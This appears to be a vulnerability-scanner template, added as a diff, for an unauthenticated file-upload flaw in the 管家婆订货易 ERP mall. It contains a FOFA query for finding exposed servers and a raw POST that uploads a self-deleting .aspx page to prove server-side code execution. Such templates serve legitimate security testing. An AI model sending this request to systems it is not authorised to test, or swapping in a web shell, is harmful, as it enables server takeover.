@@ -1,0 +1,51 @@
+id: handhara-erp-uploadimgnocheck-fileupload
+
+info:
+  name: Handhara ERP uploadimgNocheck - File Upload
+  author: qwtd
+  severity: critical
+  description: 管家婆订货易在线商城是一个专为传统企业打造的B2B订货平台，帮助传统企业构建专属的订货平台，集合了PC商城、微信商城、小程序商城、APP商城以及H5触屏版商城，形成五网合一的全方位覆盖。/api/Upload/UploadImgNoCheck接口处存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/160d45764089623693fe908a981b356cffc3b541/%E7%AE%A1%E5%AE%B6%E5%A9%86/%E7%AE%A1%E5%AE%B6%E5%A9%86%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8EUploadImgNoCheck%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa: title="订货易" || title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"
+    max-request: 1
+  tags: 管家婆订货易在线商城
+
+variables:
+  rfilename: "{{rand_base(8)}}"
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="Filedata";filename="{{rfilename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#" %>
+        <% Response.Write({{s1}}*{{s2}}); System.IO.File.Delete(Request.PhysicalPath); %>
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/Storage/UserFileImg"
+        part: body
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: status
+        status:
+          - 200
